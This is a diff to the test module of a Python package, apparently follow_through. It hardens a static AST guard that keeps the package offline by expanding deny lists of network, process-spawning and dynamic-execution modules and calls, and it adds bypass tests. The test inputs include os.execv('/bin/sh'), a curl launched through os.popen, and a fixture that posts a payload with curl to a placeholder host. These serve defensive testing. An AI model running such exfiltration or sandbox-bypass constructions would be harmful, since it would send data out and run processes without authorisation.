@@ -25,28 +25,46 @@ import follow_through
 
 PACKAGE = Path(follow_through.__file__).parent
 
-#: Modules that can reach the network, start a process, or load native code.
+#: Modules that can reach the network, start a process, load native code, or
+#: execute arbitrary source. Not exhaustive, and it cannot be: see the class
+#: docstring on :class:`WhatThisDoesNotCover`.
 FORBIDDEN_MODULES = frozenset(
     {
-        "asyncio", "ctypes", "ftplib", "http", "imaplib", "importlib",
-        "multiprocessing", "poplib", "requests", "smtplib", "socket",
-        "socketserver", "ssl", "subprocess", "telnetlib", "urllib",
-        "webbrowser", "xmlrpc",
+        "aiohttp", "antigravity", "asyncio", "builtins", "code", "ctypes",
+        "ftplib", "http", "httpx", "imaplib", "importlib", "marshal",
+        "multiprocessing", "nntplib", "pdb", "pickle", "platform", "poplib",
+        "pty", "pydoc", "requests", "runpy", "select", "selectors", "shelve",
+        "smtpd", "smtplib", "socket", "socketserver", "ssl", "subprocess",
+        "telnetlib", "timeit", "urllib", "webbrowser", "wsgiref", "xmlrpc",
     }
 )
 
-#: ``os`` is allowed, because atomic file writing needs it. These are not.
+#: ``os`` is allowed, because writing a file atomically needs it. These are not.
+#: Checked by name wherever they appear, so ``import os as o; o.popen(...)`` and
+#: ``from os import popen`` are caught as well as ``os.popen(...)``.
 FORBIDDEN_OS_CALLS = frozenset(
     {
-        "system", "popen", "fork", "forkpty", "posix_spawn", "posix_spawnp",
         "execl", "execle", "execlp", "execv", "execve", "execvp", "execvpe",
-        "spawnl", "spawnle", "spawnlp", "spawnv", "spawnve", "spawnvp",
-        "startfile",
+        "fork", "forkpty", "popen", "posix_spawn", "posix_spawnp", "spawnl",
+        "spawnle", "spawnlp", "spawnv", "spawnve", "spawnvp", "spawnvpe",
+        "startfile", "system",
     }
 )
 
-#: Ways to reach a forbidden module without writing an import statement.
-FORBIDDEN_BUILTINS = frozenset({"__import__", "compile", "eval", "exec"})
+#: Ways to reach any of the above without naming it in an import statement.
+#: Checked as bare names and as imported names.
+FORBIDDEN_NAMES = frozenset(
+    {
+        "__builtins__", "__import__", "builtins", "compile", "eval", "exec",
+        "getattr", "globals", "importlib", "locals", "vars",
+    }
+)
+
+#: The subset of the above that is still dangerous written as an attribute, as
+#: in ``builtins.eval(...)``. ``compile`` and ``getattr`` are deliberately absent:
+#: ``re.compile`` is how every pattern in this package is built, and an attribute
+#: named ``getattr`` is not the builtin.
+FORBIDDEN_ATTRIBUTES = FORBIDDEN_OS_CALLS | {"__import__", "eval", "exec"}
 
 
 def modules() -> list[Path]:
@@ -55,7 +73,13 @@ def modules() -> list[Path]:
 
 
 def offences(source: str, filename: str = "<source>") -> set[str]:
-    """Return everything in ``source`` that would break the offline promise."""
+    """Return everything in ``source`` that would break the offline promise.
+
+    Names are checked wherever they appear rather than only in the one shape
+    they are usually written. An earlier version of this function inspected
+    ``os.popen`` as an attribute of a variable literally called ``os``, which
+    meant ``import os as o`` and ``from os import popen`` both walked past it.
+    """
     tree = ast.parse(source, filename=filename)
     found: set[str] = set()
     for node in ast.walk(tree):
@@ -65,18 +89,25 @@ def offences(source: str, filename: str = "<source>") -> set[str]:
                 if root in FORBIDDEN_MODULES:
                     found.add(f"import {root}")
         elif isinstance(node, ast.ImportFrom):
-            if node.module and node.level == 0:
-                root = node.module.split(".")[0]
-                if root in FORBIDDEN_MODULES:
-                    found.add(f"from {root} import ...")
+            root = (node.module or "").split(".")[0]
+            if node.level == 0 and root in FORBIDDEN_MODULES:
+                found.add(f"from {root} import ...")
+            for alias in node.names:
+                if alias.name == "*":
+                    found.add(f"from {node.module} import *")
+                elif alias.name in FORBIDDEN_OS_CALLS or alias.name in FORBIDDEN_NAMES:
+                    found.add(f"from {node.module} import {alias.name}")
         elif isinstance(node, ast.Attribute):
-            value = node.value
-            if isinstance(value, ast.Name) and value.id == "os":
-                if node.attr in FORBIDDEN_OS_CALLS:
-                    found.add(f"os.{node.attr}")
+            if node.attr in FORBIDDEN_ATTRIBUTES:
+                found.add(f".{node.attr}")
         elif isinstance(node, ast.Name):
-            if node.id in FORBIDDEN_BUILTINS:
+            if node.id in FORBIDDEN_OS_CALLS or node.id in FORBIDDEN_NAMES:
                 found.add(node.id)
+        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
+            # getattr(os, "popen") hides the name in a string. The package has
+            # no legitimate reason to contain one of these as a literal.
+            if node.value in FORBIDDEN_OS_CALLS or node.value in FORBIDDEN_MODULES:
+                found.add(f"literal {node.value!r}")
     return found
 
 
@@ -112,10 +143,30 @@ class TheGuardCanFail(unittest.TestCase):
         self.assert_caught("from http import client\n", "from http import ...")
 
     def test_catches_a_process_launch_through_os(self):
-        self.assert_caught("import os\nos.popen('curl example.com')\n", "os.popen")
+        self.assert_caught("import os\nos.popen('curl example.com')\n", ".popen")
 
     def test_catches_exec_through_os(self):
-        self.assert_caught("import os\nos.execv('/bin/sh', [])\n", "os.execv")
+        self.assert_caught("import os\nos.execv('/bin/sh', [])\n", ".execv")
+
+    def test_catches_a_process_launch_imported_by_name(self):
+        self.assert_caught("from os import system\n", "from os import system")
+
+    def test_catches_a_process_launch_behind_an_alias(self):
+        self.assert_caught("import os as o\no.popen('x')\n", ".popen")
+
+    def test_catches_the_name_hidden_in_a_string(self):
+        self.assert_caught("import os\ngetattr(os, 'popen')('x')\n", "getattr")
+
+    def test_catches_a_star_import(self):
+        self.assert_caught("from urllib import *\n", "from urllib import *")
+
+    def test_catches_the_spawn_family_completely(self):
+        for call in ("spawnv", "spawnvpe", "posix_spawn", "forkpty"):
+            with self.subTest(call=call):
+                self.assert_caught(f"import os\nos.{call}()\n", f".{call}")
+
+    def test_allows_the_re_module_this_package_is_built_on(self):
+        self.assertEqual(offences("import re\nre.compile('x')\n"), set())
 
     def test_catches_the_dynamic_import_hatch(self):
         self.assert_caught("x = __import__('socket')\n", "__import__")
@@ -131,12 +182,44 @@ class TheGuardCanFail(unittest.TestCase):
         source = "import os\nos.replace('a', 'b')\nos.fdopen(1)\n"
         self.assertEqual(offences(source), set())
 
+    def test_a_real_smuggled_module_is_caught(self):
+        # The shape of an actual attempt, not a one-line probe.
+        source = (
+            "from os import popen as run\n"
+            "def send(payload):\n"
+            "    return run('curl -d @- https://example.invalid').write(payload)\n"
+        )
+        self.assertNotEqual(offences(source), set())
+
     def test_scanner_reads_a_file_from_disk(self):
         # The real test reads files; prove that path works, outside the repo.
         with tempfile.TemporaryDirectory() as directory:
             sample = Path(directory) / "sample.py"
             sample.write_text("import socket\n", encoding="utf-8")
             self.assertIn("import socket", offences(sample.read_text(encoding="utf-8")))
+
+
+
+class WhatThisDoesNotCover(unittest.TestCase):
+    """The limits of this check, written down rather than left to be discovered.
+
+    This is a static read of one package's source. It is a guard against drift,
+    not a sandbox. It cannot see what a dependency does, it does not run the
+    code, and a determined author could still find a construction it does not
+    model. What it does do is make the offline promise expensive to break by
+    accident, and impossible to break in any of the obvious ways without a test
+    turning red.
+
+    The list of forbidden modules is not exhaustive and never will be. That is
+    why names are also checked wherever they appear, and why anything that
+    resolves a name at runtime is refused outright.
+    """
+
+    def test_the_package_declares_no_dependencies(self):
+        # The guard only reads this package. That is only good enough because
+        # there is nothing else in the install to read.
+        manifest = (PACKAGE.parent / "pyproject.toml").read_text(encoding="utf-8")
+        self.assertIn("dependencies = []", manifest)
 
 
 if __name__ == "__main__":
